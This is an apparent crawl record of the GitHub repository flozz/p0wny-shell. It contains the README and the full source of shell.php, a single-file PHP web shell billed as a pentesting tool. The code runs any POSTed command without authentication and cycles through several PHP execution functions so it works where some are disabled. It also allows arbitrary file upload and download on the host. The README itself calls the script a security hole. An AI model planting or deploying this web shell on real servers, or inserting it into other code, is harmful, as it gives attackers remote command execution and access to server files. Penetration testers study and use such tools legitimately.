{
  "metadata": {
    "timestamp": 1736711956296,
    "page": 402,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjQxMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "flozz/p0wny-shell",
      "stars": 2242,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": "Dockerfile",
          "type": "blob",
          "size": 0.5498046875,
          "content": "FROM debian:buster-slim\n\nRUN apt-get update \\\n    && apt-get install -y locales apache2 php7.3 \\\n    && rm -rf /var/lib/apt/lists/* \\\n    && localedef -i en_US -c -f UTF-8 -A /usr/share/locale/locale.alias en_US.UTF-8 \\\n    && chown -R www-data:www-data /var/www/html\n\nENV LANG en_US.utf8\nENV APACHE_RUN_DIR /var/run/apache2\nENV APACHE_RUN_USER www-data\nENV APACHE_RUN_GROUP www-data\nENV APACHE_PID_FILE /var/run/apache2/apache2.pid\nENV APACHE_LOG_DIR /var/log/apache2\n\nCOPY shell.php /var/www/html/shell.php\n\nEXPOSE 80\n\nCMD [\"/usr/sbin/apache2\", \"-DFOREGROUND\"]\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 0.4677734375,
          "content": "        DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE\n                    Version 2, December 2004\n\n Copyright (C) 2004 Sam Hocevar <sam@hocevar.net>\n\n Everyone is permitted to copy and distribute verbatim or modified\n copies of this license document, and changing it is allowed as long\n as the name is changed.\n\n            DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE\n   TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION\n\n  0. You just DO WHAT THE FUCK YOU WANT TO.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 4.060546875,
          "content": "# p0wny@shell:~# -- Single-file PHP Shell\n\n[![Discord](https://img.shields.io/badge/chat-Discord-8c9eff?logo=discord&logoColor=ffffff)](https://discord.gg/P77sWhuSs4)\n\np0wny@shell:~# is a very basic, single-file, PHP shell. It can be used to quickly execute commands on a server when pentesting a PHP application. Use it with caution: this script represents a security risk for the server.\n\n**Features:**\n\n* Command history (using arrow keys `‚Üë` `‚Üì`)\n* Auto-completion of command and file names (using `Tab` key)\n* Navigate on the remote file-system (using `cd` command)\n* Upload a file to the server (using `upload <destination_file_name>` command)\n* Download a file from the server (using `download <file_name>` command)\n\n**WARNING:** THIS SCRIPT IS A SECURITY HOLE. **DO NOT** UPLOAD IT ON A SERVER UNLESS YOU KNOW WHAT YOU ARE DOING!\n\n![Screenshot](./screenshot.png)\n\n\n**Demo with Docker:**\n\n        docker build -t p0wny .\n        docker run -it -p 8080:80 -d p0wny\n        # open with your browser http://127.0.0.1:8080/shell.php\n\n\n## Contributing\n\n### Questions\n\nIf you have any question, you can:\n\n* [Open an issue](https://github.com/flozz/p0wny-shell/issues) on GitHub\n* [Ask on Discord](https://discord.gg/P77sWhuSs4) (I am not always available to chat, but I try to answer to everyone)\n\n\n### Bugs\n\nPlease [open an issue](https://github.com/flozz/p0wny-shell/issues) on GitHub with as much information as possible if you found a bug:\n\n* Your operating system¬†/ Linux distribution (and its version)\n* The PHP version you are using (example: `PHP-FPM 8.1`, `Apache mod_php 7.4`,...)\n* The Web server you are using and its version (example: `Nginx 1.23`, `Apache 2.4.55`,...)\n* All the logs and message outputted by the software\n* etc.\n\n\n### Pull requests\n\nPlease consider [filing a bug](https://github.com/flozz/p0wny-shell/issues) before starting to work on a new feature; it will allow us to discuss the best way to do it. It is obviously unnecessary if you just want to fix a typo or small errors in the code.\n\n\n## Support this project\n\nWant to support this project?\n\n* [‚òïÔ∏è Buy me a coffee](https://www.buymeacoffee.com/flozz)\n* [üíµÔ∏è Give me a tip on PayPal](https://www.paypal.me/0xflozz)\n* [‚ù§Ô∏è Sponsor me on GitHub](https://github.com/sponsors/flozz)\n\n\n## Changelog\n\n* **v2023.08.10:**\n  * Make p0wny@shell compatible with PHP 5.3 (@FrancoisCapon, #38)\n* **v2023.05.28:**\n  * Encode all data fields as base64 to avoid encoding errors, especially on Windows (@cli-ish, #8, #35)\n* **v2023.05.22:**\n  * Display the username and the hostname in the prompt (@cli-ish, #33, #7)\n* **v2023.05.10:**\n  * Try different execution functions (`exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`) to run commands to bypass disabled functions (@cli-ish, #31, #32)\n* **v2023.02.27:**\n  * Make terminal window resizable (@FrancoisCapon, #27)\n* **v2023.02.13:**\n  * Larger terminal size on large screens (@psyray, #26)\n  * No more horozontal scrolling on small screens (@flozz)\n* **v2022.09.19:**\n  * Expand path in `cd` command (`cd ~`, `cd ~username`,...)\n  * Go home when running cd withoud argument.\n  * ‚Üí Thanks @FrancoisCapon for the suggestion (#25)\n* **v2021.01.24:**\n  * Style improvements:\n    * Better-looking scrollbar on webkit (@nakamuraos)\n    * Display a smaller logo on mobile (@nakamuraos)\n  * Ergonomic improvements:\n    * Focus the command field when clicking the page (@nakamuraos)\n    * Put the cursor at the end of the command field while navigating the history (@nakamuraos)\n* **v2019.06.07:**\n  * Adds the `clear` command to clear the terminal (@izharaazmi #12)\n* **v2018.12.15:**\n  * File upload and download feature (@Oshawk #5)\n* **v2018.06.01:**\n  * Auto-completion of command and file names (@lo001 #2)\n  * Adaptation to mobile devices (responsive) (@lo001 #2)\n  * Improved handling of stderr (@lo001 #2)\n* **v2018.05.30:**\n  * ES5 compatibility (@lo00l #1)\n  * Dependency to JQuery removed (@lo00l #1)\n  * Command history using arrow keys (@lo00l #1)\n  * Keep the command field focused when pressing the tab key\n* **v2017.10.30:**\n  * CSS: invalid color fixed\n* **v2016.11.10:**\n  * Initial release\n"
        },
        {
          "name": "RELEASE.rst",
          "type": "blob",
          "size": 0.3828125,
          "content": "Things to do when releasing a new version\n=========================================\n\nThis file is a memo for the maintainer.\n\n\n1. Release\n----------\n\n* Edit / update changelog in ``README.md``\n* Commit / tag (``git commit -m vYYYY.MM.DD && git tag vYYYY.MM.DD && git push && git push --tags``)\n\n\n2. Publish Github Release\n-------------------------\n\n* Make a release on Github\n* Add changelog\n"
        },
        {
          "name": "screenshot.png",
          "type": "blob",
          "size": 51.1767578125,
          "content": null
        },
        {
          "name": "shell.php",
          "type": "blob",
          "size": 19.8447265625,
          "content": "<?php\n\n$SHELL_CONFIG = array(\n    'username' => 'p0wny',\n    'hostname' => 'shell',\n);\n\nfunction expandPath($path) {\n    if (preg_match(\"#^(~[a-zA-Z0-9_.-]*)(/.*)?$#\", $path, $match)) {\n        exec(\"echo $match[1]\", $stdout);\n        return $stdout[0] . $match[2];\n    }\n    return $path;\n}\n\nfunction allFunctionExist($list = array()) {\n    foreach ($list as $entry) {\n        if (!function_exists($entry)) {\n            return false;\n        }\n    }\n    return true;\n}\n\nfunction executeCommand($cmd) {\n    $output = '';\n    if (function_exists('exec')) {\n        exec($cmd, $output);\n        $output = implode(\"\\n\", $output);\n    } else if (function_exists('shell_exec')) {\n        $output = shell_exec($cmd);\n    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {\n        ob_start();\n        system($cmd);\n        $output = ob_get_contents();\n        ob_end_clean();\n    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {\n        ob_start();\n        passthru($cmd);\n        $output = ob_get_contents();\n        ob_end_clean();\n    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {\n        $handle = popen($cmd, 'r');\n        while (!feof($handle)) {\n            $output .= fread($handle, 4096);\n        }\n        pclose($handle);\n    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {\n        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);\n        $output = stream_get_contents($pipes[1]);\n        proc_close($handle);\n    }\n    return $output;\n}\n\nfunction isRunningWindows() {\n    return stripos(PHP_OS, \"WIN\") === 0;\n}\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = \"\";\n\n    if (preg_match(\"/^\\s*cd\\s*(2>&1)?$/\", $cmd)) {\n        chdir(expandPath(\"~\"));\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir(expandPath($match[1]));\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        $stdout = executeCommand($cmd);\n    }\n\n    return array(\n        \"stdout\" => base64_encode($stdout),\n        \"cwd\" => base64_encode(getcwd())\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => base64_encode(getcwd()));\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    foreach ($files as &$filename) {\n        $filename = base64_encode($filename);\n    }\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => base64_encode('File not found / no read permission.'),\n            'cwd' => base64_encode(getcwd())\n        );\n    } else {\n        return array(\n            'name' => base64_encode(basename($filePath)),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => base64_encode('Invalid path / no write permission.'),\n            'cwd' => base64_encode(getcwd())\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => base64_encode('Done.'),\n            'cwd' => base64_encode(getcwd())\n        );\n    }\n}\n\nfunction initShellConfig() {\n    global $SHELL_CONFIG;\n\n    if (isRunningWindows()) {\n        $username = getenv('USERNAME');\n        if ($username !== false) {\n            $SHELL_CONFIG['username'] = $username;\n        }\n    } else {\n        $pwuid = posix_getpwuid(posix_geteuid());\n        if ($pwuid !== false) {\n            $SHELL_CONFIG['username'] = $pwuid['name'];\n        }\n    }\n\n    $hostname = gethostname();\n    if ($hostname !== false) {\n        $SHELL_CONFIG['hostname'] = $hostname;\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n} else {\n    initShellConfig();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n                width: 100vw;\n                height: 100vh;\n                overflow: hidden;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n                max-width: calc(100vw - 2 * var(--shell-margin));\n                max-height: calc(100vh - 2 * var(--shell-margin));\n                resize: both;\n                overflow: hidden;\n                width: 100%;\n                height: 100%;\n                margin: var(--shell-margin) auto;\n            }\n\n            #shell-content {\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            :root {\n                --shell-margin: 25px;\n            }\n\n            @media (min-width: 1200px) {\n                :root {\n                    --shell-margin: 50px !important;\n                }\n            }\n\n            @media (max-width: 991px),\n                   (max-height: 600px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n                :root {\n                    --shell-margin: 0 !important;\n                }\n                #shell {\n                    resize: none;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n                padding: 10px 0;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n                box-sizing: border-box;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(atob(response.name), response.file)\n                        } else {\n                            _insertStdout(atob(response.stdout));\n                            updateCwd(atob(response.cwd));\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n                    data.files = data.files.map(function(file){\n                        return atob(file);\n                    });\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(atob(response.stdout));\n                            updateCwd(atob(response.cwd));\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"‚Ä¶/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return SHELL_CONFIG[\"username\"] + \"@\" + SHELL_CONFIG[\"hostname\"] + \":<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = atob(response.cwd);\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&amp;\")\n                    .replace(/</g, \"&lt;\")\n                    .replace(/>/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n"
        }
      ]
    }
  ]
}